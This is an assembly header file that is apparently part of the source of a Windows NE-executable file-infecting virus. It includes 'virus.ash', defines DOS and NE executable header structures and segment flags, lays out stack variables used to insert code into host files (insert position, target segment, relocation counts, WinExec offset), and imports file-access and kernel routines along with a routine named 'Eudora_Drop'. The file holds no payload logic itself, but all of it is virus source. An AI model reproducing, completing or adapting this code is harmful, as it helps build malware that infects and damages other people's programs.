;======================(Directive Warez)=====================================

include virus.ash

;----------------------(Structure Warez)-------------------------------------

DOSEXE_Header   struc

		eh_Marker               dw      ?
		eh_Pages_Mod512         dw      ?
		eh_Pages_Div512         dw      ?
		eh_Relocation_Count     dw      ?
		eh_Header_Paragraphs    dw      ?
		eh_MinMem_Paragraphs    dw      ?
		eh_MaxMem_Paragraphs    dw      ?
		eh_SS                   dw      ?
		eh_SP                   dw      ?
		eh_Checksum             dw      ?
		eh_IP                   dw      ?
		eh_CS                   dw      ?
		eh_Relocation_Ofs       dw      ?
		eh_Overlay_Number       dw      ?
		@eh_Size                db      ?

DOSEXE_Header   ends
SetSize         eh_Size

;--------------------------------------------------------
NewEXE_Header   struc
		
		neh_Marker                      dw      ?
		neh_Linker_Version              dw      ?
		neh_EntryTable_Ofs              dw      ?
		neh_EntryTable_Length           dw      ?
		neh_FileLoad_CRC                dd      ?
		neh_Program_Flags               db      ?
		neh_Application_Flags           db      ?
		neh_AutoData_Segment            dw      ?
		neh_LHeap_Size                  dw      ?
		neh_Stack_Size                  dw      ?
		neh_CSIP                        dd      ?
		neh_SSSP                        dd      ?
		neh_SegmentTable_Count          dw      ?
		neh_ModuleReference_Count       dw      ?
		neh_NonResNames_Length          dw      ?
		neh_SegmentTable_Ofs            dw      ?
		neh_ResourceTable_Ofs           dw      ?
		neh_ResNamesTable_Ofs           dw      ?
		neh_ModuleReference_Ofs         dw      ?
		neh_ImpNamesTable_Ofs           dw      ?
		neh_NonResNamesTable_FilePos    dd      ?
		neh_MoveableEntryPoint_Count    dw      ?
		neh_SegmentTable_Shift          dw      ?
		neh_ResourceTable_Count         dw      ?
		neh_TargetOS                    db      ?
		neh_OtherEXE_Flags              db      ?
		neh_GangloadArea_Ofs            dw      ?
		neh_GangloadArea_Length         dw      ?
		@neh_Size                       db      ?

NewEXE_Header   ends
SetSize         neh_Size

;--------------------------------------------------------
seg_Data                =       0000000000000001b
;                               0000000000000010b
seg_RealMode            =       0000000000000100b
seg_Iterated            =       0000000000001000b
seg_Movable             =       0000000000010000b
seg_Sharable            =       0000000000100000b
seg_Preloaded           =       0000000001000000b
seg_ExecuteOnly         =       0000000010000000b
seg_Relocations         =       0000000100000000b
seg_DebugInfoPresent    =       0000001000000000b
seg_286DPL_bits         =       0000110000000000b
seg_Discardable         =       0001000000000000b
seg_DiscardPriority     =       1110000000000000b
;--------------------------------------------------------
NE_Segment_Record struc

		neseg_Sector_Ofs                dw      ?
		neseg_FileImage_Length          dw      ?
		neseg_Attributes                dw      ?
		neseg_MemImage_Length           dw      ?

NE_Segment_Record ends


;-----------------------(Stack Variables)-----------------------------------
sv0                             struc

_BigBuffer_Selector             dw      ?
_SegmentTable_Selector          dw      ?
union
  _EntryTable_Selector          dw      ?
  _ModuleTable_Selector         dw      ?
ends
_ResourceTable_Selector         dw      ?
_FileHandle                     dw      ?
_Relocation_Count               dw      ?
_Kernel_ModuleIndex             dw      ?
_ResourceTable_Length           dw      ?
_WINEXEC_Offset                 dw      ?
_MoveSize                       dw      ?
_MoveFromPos                    dd      ?
_InsertPos                      dd      ?
_TargetSegment                  dw      ?
_TargetDelta                    dw      ?
_ModuleTable_Length             dw      ?
union
  _NE_Header                    db      neh_Size dup(?)
  _DOS_Header                   db      eh_Size dup(?)
ends
_ReadWrite_Length               dw      ?
_Win32_Present                  dw      ?
_NEHeader_FilePos               dd      ?
@stack_var_size                 db      ?

sv0                             ends
SetSize stack_var_size

StackVar        BigBuffer_Selector
StackVar        SegmentTable_Selector
StackVar        EntryTable_Selector
StackVar        ModuleTable_Selector
StackVar        ResourceTable_Selector
StackVar        FileHandle
StackVar        Relocation_Count
StackVar        Kernel_ModuleIndex
StackVar        ResourceTable_Length
StackVar        WINEXEC_Offset
StackVar        MoveSize
StackVar        MoveFromPos
StackVar        InsertPos
StackVar        TargetSegment
StackVar        TargetDelta
StackVar        ModuleTable_Length
StackVar        NE_Header
StackVar        DOS_Header
StackVar        ReadWrite_Length
StackVar        Win32_Present
StackVar        NEHeader_FilePos

;-----------------------(Import Warez)---------------------------------------

extrn   _LCREAT:PROC
extrn   _LOPEN:PROC
extrn   _LLSEEK:PROC
extrn   _LREAD:PROC
extrn   _LWRITE:PROC
extrn   _LCLOSE:PROC
extrn   GLOBALALLOC:PROC
extrn   GLOBALLOCK:PROC
extrn   GLOBALUNLOCK:PROC
extrn   GLOBALFREE:PROC
extrn   GETMODULEHANDLE:PROC
extrn   GETMODULEFILENAME:PROC
extrn   GETEXEPTR:PROC
extrn   INITTASK:PROC

extrn   Eudora_Drop:PROC
extrn   vend:PROC

;============================================================================
